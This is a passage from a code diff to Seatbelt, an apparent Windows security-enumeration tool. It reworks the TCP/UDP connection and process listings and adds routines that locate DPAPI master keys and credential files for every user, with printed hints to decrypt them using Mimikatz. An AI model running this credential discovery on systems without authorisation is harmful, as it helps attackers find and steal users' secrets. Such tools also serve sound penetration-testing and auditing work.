+                            Console.WriteLine("\r\n\r\n  Interface     : n/a --- Index {0}", indexAdapter);
                         }
-                        Console.WriteLine("  Internet Address      Physical Address      Type");
+                        Console.WriteLine("    Internet Address      Physical Address      Type");
                         currentIndexAdaper = indexAdapter;
                     }
 
@@ -4250,7 +4476,7 @@ namespace Seatbelt
                     string physAddr = BitConverter.ToString(macBytes);
                     ArpEntryType entryType = (ArpEntryType)arpEntry.dwType;
 
-                    Console.WriteLine(String.Format("  {0,-22}{1,-22}{2}", ipAddr, physAddr, entryType));
+                    Console.WriteLine(String.Format("    {0,-22}{1,-22}{2}", ipAddr, physAddr, entryType));
                 }
 
                 FreeMibTable(buffer);
@@ -4261,211 +4487,224 @@ namespace Seatbelt
             }
         }
 
+        // helper that gets a service name from a service tag
+        private static string GetServiceNameFromTag(uint ProcessId, uint ServiceTag)
+        {
+            SC_SERVICE_TAG_QUERY serviceTagQuery = new SC_SERVICE_TAG_QUERY
+            {
+                ProcessId = ProcessId,
+                ServiceTag = ServiceTag
+            };
+
+            uint res = I_QueryTagInformation(IntPtr.Zero, SC_SERVICE_TAG_QUERY_TYPE.ServiceNameFromTagInformation, ref serviceTagQuery);
+            if (res == ERROR_SUCCESS)
+            {
+                return Marshal.PtrToStringUni(serviceTagQuery.Buffer);
+            }
+            else
+            {
+                return null;
+            }
+        }
+
         public static void ListAllTcpConnections()
         {
+            int AF_INET = 2;    // IP_v4
+            uint tableBufferSize = 0;
+            uint ret = 0;
+            IntPtr tableBuffer = IntPtr.Zero;
+            IntPtr rowPtr = IntPtr.Zero;
+            MIB_TCPTABLE_OWNER_MODULE ownerModuleTable;
+            MIB_TCPROW_OWNER_MODULE[] TcpRows;
+            Dictionary<string, string> processes = new Dictionary<string, string>();
+
+            Console.WriteLine("\r\n\r\n=== Active TCP Network Connections ===\r\n");
+
             try
             {
-                // adapted from https://stackoverflow.com/questions/577433/which-pid-listens-on-a-given-port-in-c-sharp/577660#577660
-
-                Console.WriteLine("\r\n\r\n=== Active TCP Network Connections ===\r\n");
-                
-                // build a PID -> process name lookup table
-                Dictionary<string, string> processes = new Dictionary<string, string>();
-                string wmiQuery = string.Format("SELECT * FROM Win32_Process");
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiQuery);
+                // Adapted from https://stackoverflow.com/questions/577433/which-pid-listens-on-a-given-port-in-c-sharp/577660#577660
+                // Build a PID -> process name lookup table
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process");
                 ManagementObjectCollection retObjectCollection = searcher.Get();
 
                 foreach (ManagementObject Process in retObjectCollection)
                 {
-                    processes.Add(Process["ProcessId"].ToString(), Process["Name"].ToString());
+                    if (Process["CommandLine"] != null)
+                    {
+                        processes.Add(Process["ProcessId"].ToString(), Process["CommandLine"].ToString());
+                    }
+                    else
+                    {
+                        processes.Add(Process["ProcessId"].ToString(), Process["Name"].ToString());
+                    }
                 }
 
-                MIB_TCPROW_OWNER_PID[] tTable;
-                int AF_INET = 2;    // IP_v4
-                int buffSize = 0;
-
-                // figure out how much memory we need for the result struct
-                uint ret = GetExtendedTcpTable(IntPtr.Zero,
-                    ref buffSize,
-                    true,
-                    AF_INET,
-                    TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL,
-                    0);
-                if (ret != 0 && ret != 122)
+                // Figure out how much memory we need for the result struct
+                ret = GetExtendedTcpTable(IntPtr.Zero, ref tableBufferSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_MODULE_ALL, 0);
+                if (ret != ERROR_SUCCESS && ret != ERROR_INSUFFICIENT_BUFFER)
                 {
                     // 122 == insufficient buffer size
                     Console.WriteLine(" [X] Bad check value from GetExtendedTcpTable : {0}", ret);
                     return;
                 }
-                IntPtr buffTable = Marshal.AllocHGlobal(buffSize);
 
-                try
+                tableBuffer = Marshal.AllocHGlobal((int)tableBufferSize);
+
+                ret = GetExtendedTcpTable(tableBuffer, ref tableBufferSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_MODULE_ALL, 0);
+                if (ret != ERROR_SUCCESS)
                 {
-                    ret = GetExtendedTcpTable(buffTable,
-                        ref buffSize,
-                        true,
-                        AF_INET,
-                        TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL,
-                        0);
-
-                    if (ret != 0)
-                    {
-                        Console.WriteLine(" [X] Bad return value from GetExtendedTcpTable : {0}", ret);
-                        return;
-                    }
-
-                    // get the number of entries in the table
-                    MIB_TCPTABLE_OWNER_PID tab =
-                        (MIB_TCPTABLE_OWNER_PID)Marshal.PtrToStructure(
-                            buffTable,
-                            typeof(MIB_TCPTABLE_OWNER_PID));
-
-                    IntPtr rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
-                    tTable = new MIB_TCPROW_OWNER_PID[tab.dwNumEntries];
-
-                    for (int i = 0; i < tab.dwNumEntries; i++)
-                    {
-                        MIB_TCPROW_OWNER_PID tcpRow = (MIB_TCPROW_OWNER_PID)Marshal
-                            .PtrToStructure(rowPtr, typeof(MIB_TCPROW_OWNER_PID));
-                        tTable[i] = tcpRow;
-                        // next entry
-                        rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
-                    }
-                }
-                finally
-                {
-                    // Free the Memory
-                    Marshal.FreeHGlobal(buffTable);
+                    Console.WriteLine(" [X] Bad return value from GetExtendedTcpTable : {0}", ret);
+                    return;
                 }
 
-                Console.WriteLine("    Local Address          Foreign Address        State      PID   ProcessName");
-                foreach (MIB_TCPROW_OWNER_PID entry in tTable)
+                // get the number of entries in the table
+                ownerModuleTable = (MIB_TCPTABLE_OWNER_MODULE)Marshal.PtrToStructure(tableBuffer, typeof(MIB_TCPTABLE_OWNER_MODULE));
+                rowPtr = (IntPtr)(tableBuffer.ToInt64() + Marshal.OffsetOf(typeof(MIB_TCPTABLE_OWNER_MODULE), "Table").ToInt64());
+                TcpRows = new MIB_TCPROW_OWNER_MODULE[ownerModuleTable.NumEntries];
+
+                for (int i = 0; i < ownerModuleTable.NumEntries; i++)
+                {
+                    MIB_TCPROW_OWNER_MODULE tcpRow =
+                        (MIB_TCPROW_OWNER_MODULE)Marshal.PtrToStructure(rowPtr, typeof(MIB_TCPROW_OWNER_MODULE));
+                    TcpRows[i] = tcpRow;
+                    // next entry
+                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
+                }
+
+                Console.WriteLine("  Local Address          Foreign Address        State      PID   Service         ProcessName");
+                foreach (MIB_TCPROW_OWNER_MODULE entry in TcpRows)
                 {
                     string processName = "";
                     try
                     {
-                        processName = processes[entry.owningPid.ToString()];
+                        processName = processes[entry.OwningPid.ToString()];
                     }
                     catch { }
-                    Console.WriteLine(String.Format("    {0,-23}{1,-23}{2,-11}{3,-6}{4}", entry.LocalAddress + ":" + entry.LocalPort, entry.RemoteAddress + ":" + entry.RemotePort, entry.State, entry.owningPid, processName));
+
+                    string serviceName = GetServiceNameFromTag(entry.OwningPid, (uint)entry.OwningModuleInfo0);
+
+                    Console.WriteLine(String.Format("  {0,-23}{1,-23}{2,-11}{3,-6}{4,-15} {5}", entry.LocalAddress + ":" + entry.LocalPort, entry.RemoteAddress + ":" + entry.RemotePort, entry.State, entry.OwningPid, serviceName, processName));
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("  [X] Exception: {0}", ex.Message);
+            }
+            finally
+            {
+                if (tableBuffer != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(tableBuffer);
+                }
             }
         }
 
         public static void ListAllUdpConnections()
         {
+            int AF_INET = 2;    // IP_v4
+            uint tableBufferSize = 0;
+            uint ret = 0;
+            IntPtr tableBuffer = IntPtr.Zero;
+            IntPtr rowPtr = IntPtr.Zero;
+            MIB_UDPTABLE_OWNER_MODULE ownerModuleTable;
+            MIB_UDPROW_OWNER_MODULE[] UdpRows;
+            Dictionary<string, string> processes = new Dictionary<string, string>();
+
+            Console.WriteLine("\r\n\r\n=== Active UDP Network Connections ===\r\n");
+
             try
             {
-                // adapted from https://stackoverflow.com/questions/577433/which-pid-listens-on-a-given-port-in-c-sharp/577660#577660
-
-                Console.WriteLine("\r\n\r\n=== Active UDP Network Connections ===\r\n");
-
-                Dictionary<string, string> processes = new Dictionary<string, string>();
-
-                string wmiQuery = string.Format("SELECT * FROM Win32_Process");
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiQuery);
+                // Adapted from https://stackoverflow.com/questions/577433/which-pid-listens-on-a-given-port-in-c-sharp/577660#577660
+                // Build a PID -> process name lookup table
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process");
                 ManagementObjectCollection retObjectCollection = searcher.Get();
 
                 foreach (ManagementObject Process in retObjectCollection)
                 {
-                    processes.Add(Process["ProcessId"].ToString(), Process["Name"].ToString());
+                    if (Process["CommandLine"] != null)
+                    {
+                        processes.Add(Process["ProcessId"].ToString(), Process["CommandLine"].ToString());
+                    }
+                    else
+                    {
+                        processes.Add(Process["ProcessId"].ToString(), Process["Name"].ToString());
+                    }
                 }
 
-                MIB_UDPROW_OWNER_PID[] tTable;
-                int AF_INET = 2;    // IP_v4
-                int buffSize = 0;
-
-                // figure out how much memory we need for the result struct
-                uint ret = GetExtendedUdpTable(IntPtr.Zero,
-                    ref buffSize,
-                    true,
-                    AF_INET,
-                    UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID,
-                    0);
-                if (ret != 0 && ret != 122)
+                // Figure out how much memory we need for the result struct
+                ret = GetExtendedUdpTable(IntPtr.Zero, ref tableBufferSize, true, AF_INET, UDP_TABLE_CLASS.UDP_TABLE_OWNER_MODULE, 0);
+                if (ret != ERROR_SUCCESS && ret != ERROR_INSUFFICIENT_BUFFER)
                 {
                     // 122 == insufficient buffer size
-                    //throw new Exception("bad ret on check " + ret);
                     Console.WriteLine(" [X] Bad check value from GetExtendedUdpTable : {0}", ret);
                     return;
                 }
-                IntPtr buffTable = Marshal.AllocHGlobal(buffSize);
 
-                try
+                tableBuffer = Marshal.AllocHGlobal((int)tableBufferSize);
+
+                ret = GetExtendedUdpTable(tableBuffer, ref tableBufferSize, true, AF_INET, UDP_TABLE_CLASS.UDP_TABLE_OWNER_MODULE, 0);
+                if (ret != ERROR_SUCCESS)
                 {
-                    ret = GetExtendedUdpTable(buffTable,
-                        ref buffSize,
-                        true,
-                        AF_INET,
-                        UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID,
-                        0);
-                    if (ret != 0)
-                    {
-                        Console.WriteLine(" [X] Bad return value from GetExtendedUdpTable : {0}", ret);
-                        return;
-                    }
-
-                    // get the number of entries in the table
-                    MIB_UDPTABLE_OWNER_PID tab =
-                        (MIB_UDPTABLE_OWNER_PID)Marshal.PtrToStructure(
-                            buffTable,
-                            typeof(MIB_UDPTABLE_OWNER_PID));
-
-                    IntPtr rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
-                    tTable = new MIB_UDPROW_OWNER_PID[tab.dwNumEntries];
-
-                    for (int i = 0; i < tab.dwNumEntries; i++)
-                    {
-                        MIB_UDPROW_OWNER_PID tcpRow = (MIB_UDPROW_OWNER_PID)Marshal
-                            .PtrToStructure(rowPtr, typeof(MIB_UDPROW_OWNER_PID));
-                        tTable[i] = tcpRow;
-                        // next entry
-                        rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
-                    }
-                }
-                finally
-                {
-                    // Free the Memory
-                    Marshal.FreeHGlobal(buffTable);
+                    Console.WriteLine(" [X] Bad return value from GetExtendedUdpTable : {0}", ret);
+                    return;
                 }
 
-                Console.WriteLine("    Local Address            PID     ProcessName");
-                foreach (MIB_UDPROW_OWNER_PID entry in tTable)
+                // get the number of entries in the table
+                ownerModuleTable = (MIB_UDPTABLE_OWNER_MODULE)Marshal.PtrToStructure(tableBuffer, typeof(MIB_UDPTABLE_OWNER_MODULE));
+                rowPtr = (IntPtr)(tableBuffer.ToInt64() + Marshal.OffsetOf(typeof(MIB_UDPTABLE_OWNER_MODULE), "Table").ToInt64());
+                UdpRows = new MIB_UDPROW_OWNER_MODULE[ownerModuleTable.NumEntries];
+
+                for (int i = 0; i < ownerModuleTable.NumEntries; i++)
+                {
+                    MIB_UDPROW_OWNER_MODULE udpRow =
+                        (MIB_UDPROW_OWNER_MODULE)Marshal.PtrToStructure(rowPtr, typeof(MIB_UDPROW_OWNER_MODULE));
+                    UdpRows[i] = udpRow;
+                    // next entry
+                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(udpRow));
+                }
+
+                Console.WriteLine("  Local Address          PID    Service                 ProcessName");
+                foreach (MIB_UDPROW_OWNER_MODULE entry in UdpRows)
                 {
                     string processName = "";
                     try
                     {
-                        processName = processes[entry.owningPid.ToString()];
+                        processName = processes[entry.OwningPid.ToString()];
                     }
                     catch { }
+                    
+                    string serviceName = GetServiceNameFromTag(entry.OwningPid, (uint)entry.OwningModuleInfo0);
 
-                    Console.WriteLine(String.Format("    {0,-25}{1,-8}{2}", entry.LocalAddress + ":" + entry.LocalPort, entry.owningPid, processName));
+                    Console.WriteLine(String.Format("  {0,-23}{1,-7}{2,-23} {3}", entry.LocalAddress + ":" + entry.LocalPort, entry.OwningPid, serviceName, processName));
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("  [X] Exception: {0}", ex.Message);
             }
+            finally
+            {
+                if (tableBuffer != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(tableBuffer);
+                }
+            }
         }
 
         public static void ListNonstandardProcesses()
         {
-            // lists processes with binary paths not in C:\Windows\System32\ ,
+            // lists currently running processes that don't have "Microsoft Corporation" as the company name in their file info
             //      or all processes if "full" is passed
 
             if (FilterResults.filter)
             {
-                Console.WriteLine("\r\n\r\n=== Non C:\\Windows\\ Processes (via WMI) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== Non Microsoft Processes (via WMI) ===\r\n");
             }
             else
             {
-                Console.WriteLine("\r\n\r\n=== Processes (via WMI) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== All Processes (via WMI) ===\r\n");
             }
-            
+
             try
             {
                 var wmiQueryString = "SELECT ProcessId, ExecutablePath, CommandLine FROM Win32_Process";
@@ -4483,37 +4722,41 @@ namespace Seatbelt
                                 };
                     foreach (var item in query)
                     {
-                        if ((item.Path != null) && ((!FilterResults.filter) || (!Regex.IsMatch(item.Path, "C:\\\\WINDOWS\\\\", RegexOptions.IgnoreCase))))
-                        {
-                            bool isDotNet = false;
-                            try
+                        //OLD -  if ((item.Path != null) && ((!FilterResults.filter) || (!Regex.IsMatch(item.Path, "C:\\\\WINDOWS\\\\", RegexOptions.IgnoreCase))))
+                        if ((item.Path != null)) {
+                            FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo(item.Path);
+                            string companyName = myFileVersionInfo.CompanyName;
+                            if ((String.IsNullOrEmpty(companyName)) || (!FilterResults.filter) || (!Regex.IsMatch(companyName, @"^Microsoft.*", RegexOptions.IgnoreCase)))
                             {
-                                AssemblyName myAssemblyName = AssemblyName.GetAssemblyName(item.Path);
-                                isDotNet = true;
-                            }
-                            catch (System.IO.FileNotFoundException)
-                            {
-                                // System.Console.WriteLine("The file cannot be found.");
-                            }
-
-                            catch (System.BadImageFormatException exception)
-                            {
-                                if (Regex.IsMatch(exception.Message, ".*This assembly is built by a runtime newer than the currently loaded runtime and cannot be loaded.*", RegexOptions.IgnoreCase))
+                                bool isDotNet = false;
+                                try
                                 {
+                                    AssemblyName myAssemblyName = AssemblyName.GetAssemblyName(item.Path);
                                     isDotNet = true;
                                 }
-                            }
+                                catch (System.IO.FileNotFoundException)
+                                {
+                                    // System.Console.WriteLine("The file cannot be found.");
+                                }
+                                catch (System.BadImageFormatException exception)
+                                {
+                                    if (Regex.IsMatch(exception.Message, ".*This assembly is built by a runtime newer than the currently loaded runtime and cannot be loaded.*", RegexOptions.IgnoreCase))
+                                    {
+                                        isDotNet = true;
+                                    }
+                                }
+                                catch
+                                {
+                                    // System.Console.WriteLine("The assembly has already been loaded.");
+                                }
 
-                            catch
-                            {
-                                // System.Console.WriteLine("The assembly has already been loaded.");
+                                Console.WriteLine("  Name           : {0}", item.Process.ProcessName);
+                                Console.WriteLine("  Company Name   : {0}", companyName);
+                                Console.WriteLine("  PID            : {0}", item.Process.Id);
+                                Console.WriteLine("  Path           : {0}", item.Path);
+                                Console.WriteLine("  CommandLine    : {0}", item.CommandLine);
+                                Console.WriteLine("  IsDotNet       : {0}\r\n", isDotNet);
                             }
-
-                            Console.WriteLine("  Name           : {0}", item.Process.ProcessName);
-                            Console.WriteLine("  PID            : {0}", item.Process.Id);
-                            Console.WriteLine("  Path           : {0}", item.Path);
-                            Console.WriteLine("  CommandLine    : {0}", item.CommandLine);
-                            Console.WriteLine("  IsDotNet       : {0}\r\n", isDotNet);
                         }
                     }
                 }
@@ -4533,10 +4776,11 @@ namespace Seatbelt
             // grab events from the last X days - 7 for default, 30 for "full" collection
             int lastDays = 7;
 
-            if (!FilterResults.filter) {
+            if (!FilterResults.filter)
+            {
                 lastDays = 30;
             }
-            
+
             var startTime = System.DateTime.Now.AddDays(-lastDays);
             var endTime = System.DateTime.Now;
 
@@ -4614,7 +4858,7 @@ namespace Seatbelt
         public static void List4648Events()
         {
             var eventId = "4648";
-            
+
             // grab events from the last X days - 7 for default, 30 for "full" collection
             int lastDays = 7;
 
@@ -4743,16 +4987,16 @@ namespace Seatbelt
                 string[] SIDs = Registry.Users.GetSubKeyNames();
                 foreach (string SID in SIDs)
                 {
-                    if(SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
+                    if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                     {
-                        string[] subkeys = GetRegSubkeys("HKU", String.Format("{0}\\Software\\Microsoft\\Terminal Server Client\\Servers",SID));
+                        string[] subkeys = GetRegSubkeys("HKU", String.Format("{0}\\Software\\Microsoft\\Terminal Server Client\\Servers", SID));
                         if (subkeys != null)
                         {
-                            Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information ({0}) ===\r\n", SID);
+                            Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information ({0}) ===", SID);
                             foreach (string host in subkeys)
                             {
                                 string usernameHint = GetRegValue("HKCU", String.Format("Software\\Microsoft\\Terminal Server Client\\Servers\\{0}", host), "UsernameHint");
-                                Console.WriteLine("  Host : {0}", host);
+                                Console.WriteLine("\r\n  Host           : {0}", host);
                                 if (usernameHint != "")
                                 {
                                     Console.WriteLine("    UsernameHint : {0}", usernameHint);
@@ -4764,20 +5008,361 @@ namespace Seatbelt
             }
             else
             {
-                Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information (Current User) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information (Current User) ===");
                 string[] subkeys = GetRegSubkeys("HKCU", "Software\\Microsoft\\Terminal Server Client\\Servers");
                 if (subkeys != null)
                 {
                     foreach (string host in subkeys)
                     {
                         string usernameHint = GetRegValue("HKCU", String.Format("Software\\Microsoft\\Terminal Server Client\\Servers\\{0}", host), "UsernameHint");
-                        Console.WriteLine("  Host : {0}", host);
+                        Console.WriteLine("\r\n  Host           : {0}", host);
                         if (usernameHint != "")
                         {
                             Console.WriteLine("    UsernameHint : {0}", usernameHint);
                         }
                     }
                 }
+            }
+        }
+
+        public static void ListMasterKeys()
+        {
+            // lists any found DPAPI master keys
+            try
+            {
+                if (IsHighIntegrity())
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for DPAPI Master Keys (All Users) ===\r\n");
+
+                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                    string[] dirs = Directory.GetDirectories(userFolder);
+                    foreach (string dir in dirs)
+                    {
+                        string[] parts = dir.Split('\\');
+                        string userName = parts[parts.Length - 1];
+                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                        {
+                            string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", dir);
+                            if (System.IO.Directory.Exists(userDPAPIBasePath))
+                            {
+                                string[] directories = Directory.GetDirectories(userDPAPIBasePath);
+                                foreach (string directory in directories)
+                                {
+                                    string[] files = Directory.GetFiles(directory);
+
+                                    Console.WriteLine("    Folder       : {0}\r\n", directory);
+
+                                    foreach (string file in files)
+                                    {
+                                        if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                                        {
+                                            DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
+                                            DateTime lastModified = System.IO.File.GetLastWriteTime(file);
+                                            string fileName = System.IO.Path.GetFileName(file);
+                                            Console.WriteLine("    MasterKey    : {0}", fileName);
+                                            Console.WriteLine("        Accessed : {0}", lastAccessed);
+                                            Console.WriteLine("        Modified : {0}\r\n", lastModified);
+                                        }
+                                    }
+                                    Console.WriteLine();
+                                }
+                            }
+                        }
+                    }
+                    Console.WriteLine("  [*] Use the Mimikatz \"dpapi::masterkey\" module with appropriate arguments (/pvk or /rpc) to decrypt");
+                    Console.WriteLine("  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz \"sekurlsa::dpapi\" module");
+                }
+                else
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for DPAPI Master Keys (Current User) ===\r\n");
+                    string userName = Environment.GetEnvironmentVariable("USERNAME");
+                    string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+
+                    if (System.IO.Directory.Exists(userDPAPIBasePath))
+                    {
+                        string[] directories = Directory.GetDirectories(userDPAPIBasePath);
+                        foreach (string directory in directories)
+                        {
+                            string[] files = Directory.GetFiles(directory);
+
+                            Console.WriteLine("    Folder       : {0}\r\n", directory);
+
+                            foreach (string file in files)
+                            {
+                                if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                                {
+                                    DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
+                                    DateTime lastModified = System.IO.File.GetLastWriteTime(file);
+                                    string fileName = System.IO.Path.GetFileName(file);
+                                    Console.WriteLine("    MasterKey    : {0}", fileName);
+                                    Console.WriteLine("        Accessed : {0}", lastAccessed);
+                                    Console.WriteLine("        Modified : {0}\r\n", lastModified);
+                                }
+                            }
+                        }
+                    }
+                    Console.WriteLine("  [*] Use the Mimikatz \"dpapi::masterkey\" module with appropriate arguments (/rpc) to decrypt");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("  [X] Exception: {0}", ex.Message);
+            }
+        }
+
+        public static void ListCredFiles()
+        {
+            // lists any found files in Local\Microsoft\Credentials\*
+            try
+            {
+                if (IsHighIntegrity())
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for Credential Files (All Users) ===\r\n");
+
+                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                    string[] dirs = Directory.GetDirectories(userFolder);
+                    bool found = false;
+
+                    foreach (string dir in dirs)
+                    {
+                        string[] parts = dir.Split('\\');
+                        string userName = parts[parts.Length - 1];
+                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                        {
+                            string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", dir);
+                            if (System.IO.Directory.Exists(userCredFilePath))
+                            {
+                                string[] systemFiles = Directory.GetFiles(userCredFilePath);
+                                if ((systemFiles != null) && (systemFiles.Length != 0))
+                                {
+                                    Console.WriteLine("\r\n    Folder       : {0}\r\n", userCredFilePath);
+
+                                    foreach (string file in systemFiles)
+                                    {
+                                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
+                                        DateTime lastModified = System.IO.File.GetLastWriteTime(file);
+                                        long size = new System.IO.FileInfo(file).Length;
+                                        string fileName = System.IO.Path.GetFileName(file);
+                                        found = true;
+                                        Console.WriteLine("    CredFile     : {0}", fileName);
+
+                                        // jankily parse the bytes to extract the credential type and master key GUID
+                                        // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
+                                        byte[] credentialArray = File.ReadAllBytes(file);
+                                        byte[] guidMasterKeyArray = new byte[16];
+                                        Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
+                                        Guid guidMasterKey = new Guid(guidMasterKeyArray);
+
+                                        byte[] stringLenArray = new byte[16];
+                                        Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
+                                        int descLen = BitConverter.ToInt32(stringLenArray, 0);
+
+                                        byte[] descBytes = new byte[descLen];
+                                        Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);
+
+                                        string desc = Encoding.Unicode.GetString(descBytes);
+                                        Console.WriteLine("    Description  : {0}", desc);
+                                        Console.WriteLine("    MasterKey    : {0}", guidMasterKey.ToString());
+                                        Console.WriteLine("    Accessed     : {0}", lastAccessed);
+                                        Console.WriteLine("    Modified     : {0}", lastModified);
+                                        Console.WriteLine("    Size         : {0}\r\n", size);
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    string systemFolder = String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"));
+                    string[] files = Directory.GetFiles(systemFolder);
+                    if ((files != null) && (files.Length != 0))
+                    {
+                        Console.WriteLine("\r\n    Folder       : {0}\r\n", systemFolder);
+
+                        foreach (string file in files)
+                        {
+                            DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
+                            DateTime lastModified = System.IO.File.GetLastWriteTime(file);
+                            long size = new System.IO.FileInfo(file).Length;
+                            string fileName = System.IO.Path.GetFileName(file);
+                            found = true;
+                            Console.WriteLine("    CredFile     : {0}", fileName);
+
+                            // jankily parse the bytes to extract the credential type and master key GUID
+                            // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
+                            byte[] credentialArray = File.ReadAllBytes(file);
+                            byte[] guidMasterKeyArray = new byte[16];
+                            Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
+                            Guid guidMasterKey = new Guid(guidMasterKeyArray);
+
+                            byte[] stringLenArray = new byte[16];
+                            Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
+                            int descLen = BitConverter.ToInt32(stringLenArray, 0);
+
+                            byte[] descBytes = new byte[descLen];
+                            Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);
+
+                            string desc = Encoding.Unicode.GetString(descBytes);
+                            Console.WriteLine("    Description  : {0}", desc);
+                            Console.WriteLine("    MasterKey    : {0}", guidMasterKey.ToString());
+                            Console.WriteLine("    Accessed     : {0}", lastAccessed);
+                            Console.WriteLine("    Modified     : {0}", lastModified);
+                            Console.WriteLine("    Size         : {0}\r\n", size);
+                        }
+                    }
+
+                    if (found)
+                    {
+                        Console.WriteLine("  [*] Use the Mimikatz \"dpapi::cred\" module with appropriate /masterkey to decrypt");
+                        Console.WriteLine("  [*] You can extract many DPAPI masterkeys from memory with the Mimikatz \"sekurlsa::dpapi\" module");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for Credential Files (Current User) ===\r\n");
+                    string userName = Environment.GetEnvironmentVariable("USERNAME");
+                    string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    bool found = false;
+
+                    if (System.IO.Directory.Exists(userCredFilePath))
+                    {
+                        string[] files = Directory.GetFiles(userCredFilePath);
+                        Console.WriteLine("    Folder       : {0}\r\n", userCredFilePath);
+
+                        foreach (string file in files)
+                        {
+                            DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
+                            DateTime lastModified = System.IO.File.GetLastWriteTime(file);
+                            long size = new System.IO.FileInfo(file).Length;
+                            string fileName = System.IO.Path.GetFileName(file);
+                            found = true;
+                            Console.WriteLine("    CredFile     : {0}", fileName);
+
+                            // jankily parse the bytes to extract the credential type and master key GUID
+                            // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
+                            byte[] credentialArray = File.ReadAllBytes(file);
+                            byte[] guidMasterKeyArray = new byte[16];
+                            Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
+                            Guid guidMasterKey = new Guid(guidMasterKeyArray);
+
+                            byte[] stringLenArray = new byte[16];
+                            Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
+                            int descLen = BitConverter.ToInt32(stringLenArray, 0);
+
+                            byte[] descBytes = new byte[descLen];
+                            Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);
+
+                            string desc = Encoding.Unicode.GetString(descBytes);
+                            Console.WriteLine("    Description  : {0}", desc);
+                            Console.WriteLine("    MasterKey    : {0}", guidMasterKey.ToString());
+                            Console.WriteLine("    Accessed     : {0}", lastAccessed);
+                            Console.WriteLine("    Modified     : {0}", lastModified);
+                            Console.WriteLine("    Size         : {0}\r\n", size);
+                        }
+                    }
+                    if (found)
+                    {
+                        Console.WriteLine("  [*] Use the Mimikatz \"dpapi::cred\" module with appropriate /masterkey to decrypt");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
